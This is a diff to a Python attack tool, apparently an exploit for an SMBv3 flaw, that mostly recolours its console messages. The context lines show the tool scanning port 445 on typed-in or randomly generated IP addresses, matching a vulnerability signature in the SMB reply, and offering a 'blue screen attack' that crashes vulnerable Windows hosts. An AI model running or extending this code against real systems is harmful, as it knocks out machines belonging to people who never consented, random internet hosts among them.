@@ -53,7 +53,7 @@ def connectSMB(IP, username=None, password=None, port=445, encode=None, connecti
         session.connect()
     elif encode is not None:
         if session.encrypt_data and not encode:
-            print("\033[33m[-]Cannot disable encryption on an already negotiated session.\033[0m")
+            print("[\033[33m-\033[0m]Cannot disable encryption on an already negotiated session.")
         elif not session.encrypt_data and encode:
             session.encrypt = True
     return session
@@ -61,9 +61,9 @@ def test_host(IP):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         status = sock.connect_ex((str(IP),445))
         if status == 0:
-            print("\033[31m[-]\033[0m\033[33mTHE ATTACK MAY FALI, BUT THE HOST OF THE OTHER PARTY IS STIALL ALIVE\033[0m")
+            print("[\033[31m-\033[0m]THE ATTACK MAY FALI, BUT THE HOST OF THE OTHER PARTY IS STIALL ALIVE")
         else:
-            print("\033[32m[+]THE ATTACK WAS SUCCESSFUL, BUT THE OTHER PARTY DID NOT RESPOND\033[0m")
+            print("[\033[32minfo\033[0m]THE ATTACK WAS SUCCESSFUL, BUT THE OTHER PARTY DID NOT RESPOND")
 def randomIP():
     return ("%d.%d.%d.%d"%(rand(0,255),rand(0,255),rand(0,255),rand(0,255)));
 def mode():
@@ -75,12 +75,12 @@ def mode():
 \033[0m"""%(showIP())+"\t")
         if len(sys.argv) == 1:
             print(SMBL)
-            a = input("\033[34m[+]\033[0mWHETHER TO ACTIVATE AUTOMATIC MODE? (y/n/exit)#")
+            a = input("[\033[34minfo\033[0m]WHETHER TO ACTIVATE AUTOMATIC MODE? (y/n/exit)#")
             if a == "exit":
                 exit(0)
             if a == "n" or a == "N" or a == "NO" or a == "no":
                 while 1:
-                    ip = input("\033[34m[+]\033[0mENTER IP#")
+                    ip = input("[\033[34minfo\033[0m]ENTER IP#")
                     if ip == "help" or ip == "HELP":
                         print("""
 command:
@@ -103,7 +103,7 @@ command:
                     sleep(1)
                     continue
             else:
-                print("\033[31m[-]\033[0m\033[33mINPUT ERROR,PLEASE CHECK THE INPUT\033[0m")
+                print("[\033[31m-\033[0m]INPUT ERROR,PLEASE CHECK THE INPUT")
         else:
             argv_IP = sys.argv[1]
             print(SMBL)
@@ -122,7 +122,7 @@ command:
             else:
                 main(argv_IP)
     except KeyboardInterrupt:
-        print("\033[33m[-]byebye\033[0m")
+        print("[\033[31m-\033[0m]byebye")
 def main(IP):
     try:
         port=445 #将445数字定义为port变量
@@ -130,7 +130,7 @@ def main(IP):
             sock.settimeout(10)
             scan = sock.connect_ex((IP,port)) #对445端口发送一个数据包,测试445端口是否开启，开启则返回0，没有开启则返回其他数
             if scan == 0: #如果打开则运行此行
-                print("\033[32m[+]\033[0m\033[33mIP %s --- PORT 445 OPEN/FILTRTED\033[0m"% IP)
+                print("[\033[32minfo\033[0m]IP %s --- PORT 445 OPEN/FILTRTED"% IP)
                 with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as smb:
                     smb.settimeout(20)
                     try:
@@ -142,10 +142,10 @@ def main(IP):
                     recv = smb.recv(b) #处理数据包
                     exploitCheck = (b"\x11\x03\x02\x00")
                     if recv[68:72] != exploitCheck: #判断是否存在\x11\x03\x02\x00数据
-                        print("\033[31m[-]\033[0m\033[33mIP %s Not Vulnerable\033[0m"% IP) #如果存在则显示此行 
+                        print("[\033[31m-\033[0m]IP %s Not Vulnerable"% IP) #如果存在则显示此行 
                     elif recv[68:72] == exploitCheck: 
-                        print("\033[32m[+]\033[0m\033[33mIP %s Vulnerable\033[0m"% IP) #如果不存在则显示此行
-                        exp=input("\033[33m[+]\033[0mWHETHER TO PERFORM A BLUE SCREEN ATTACK[Y/N]>")
+                        print("[\033[32minfo\033[0mIP %s Vulnerable"% IP) #如果不存在则显示此行
+                        exp=input("[\033[33minfo\033[0m]WHETHER TO PERFORM A BLUE SCREEN ATTACK[Y/N]>")
                         if exp == "y" or exp == "YES" or exp == "yes" or exp == "Y":
                             connectSMB(IP, username="fakeuser", password="fakepass", encode=False);test_host(IP)
                         elif exp == "N" or exp == "n" or exp == "NO" or exp == "no":
@@ -155,16 +155,16 @@ def main(IP):
                                 f.write(i) #写入
                             f.close()
             else: #判断
-                print("\033[31m[-]\033[0m\033[33mIP %s PARTY DID NOT OPEN PORT 445\033[0m"% IP) #如果对方没有打开445则显示此行
+                print("[\033[31m-\033[0m]IP %s PARTY DID NOT OPEN PORT 445"% IP) #如果对方没有打开445则显示此行
     except KeyboardInterrupt: #当ctrl+c时则执行此行
-        print("\033[33m[-]byebye!\033[0m")
+        print("[\033[33m-\033[0m]byebye!")
         exit(1) #退出代码为1，就是异常退出
     except ConnectionResetError: #如果连接失败则显示此行
-        print("\033[33m[-]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT\033[0m")
+        print("[\033[33m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
     except socket.gaierror:
-        print("\033[33m[-]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT\033[0m")
+        print("[\033[0m-\033[0m]PLEASE CHECK IF THE INTERNET PROTOCOL YOU ENTERED IS CORRECT")
     except socket.timeout:
-        print("\033[33m[-]CONNECTION THE SERVER TIMEOUT\033[0m")
+        print("[\033[0m-\033[0m]CONNECTION THE SERVER TIMEOUT")
 
 if __name__ == "__main__":
     mode()
